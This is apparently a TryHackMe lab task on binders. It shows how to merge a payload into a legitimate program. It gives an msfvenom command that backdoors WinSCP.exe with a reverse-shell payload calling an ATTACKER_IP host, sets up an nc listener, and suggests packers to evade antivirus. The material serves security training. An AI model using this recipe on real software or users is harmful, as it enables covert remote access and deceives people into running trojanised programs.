# Task 10 Binders

Task 10 Binders

While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A **binder** is a program that merges two (or more) executables into a single one. It is often used when you want to distribute your payload hidden inside another known program to fool users into believing they are executing a different program.

While every single binder might work slightly differently, they will basically add the code of your shellcode inside the legitimate program and have it executed somehow.

You could, for example, change the entry point in the PE header so that your shellcode executes right before the program and then redirect the execution back to the legitimate program once it is finished. This way, when the user clicks the resulting executable, your shellcode will get silently executed first and continue running the program normally without the user noticing it.

# Binding with msfvenom

You can easily plant a payload of your preference in any .exe file with **`msfvenom`**. The binary will still work as usual but execute an additional payload silently. The method used by msfvenom injects your malicious program by creating an extra thread for it, so it is slightly different from what was mentioned before but achieves the same result. Having a separate thread is even better since your program won't get blocked in case your shellcode fails for some reason.

For this task, we will be backdooring the WinSCP executable available at **`C:\Tools\WinSCP`**.

To create a backdoored WinSCP.exe we can use the following command on our Windows machine:

**Note:** Metasploit is installed in the Windows machine for your convenience, but it might take up to three minutes to generate the payload (the produced warnings can be safely ignored).

AttackBox

```
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

```bash
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

The resulting WinSCP-evil.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Before anything else, remember to set up an **`nc`** listener to receive the reverse shell. When you execute your backdoored executable, it should launch a reverse shell back at you while continuing to execute WinSCP.exe for the user:

# Binders and AV

Binders won't do much to hide your payload from an AV solution. The simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did.

The main use of binders is to fool users into believing they are executing a legitimate executable rather than a malicious payload.

When creating a real payload, you may want to use encoders, crypters, or packers to hide your shellcode from signature-based AVs and then bind it into a known executable so that the user doesn't know what is being executed.

Feel free to try and upload your bound executable to the THM Antivirus Check website (link available on your desktop) without any packing, and you should get a detection back from the server, so this method won't be of much help when trying to get the flag from the server by itself.
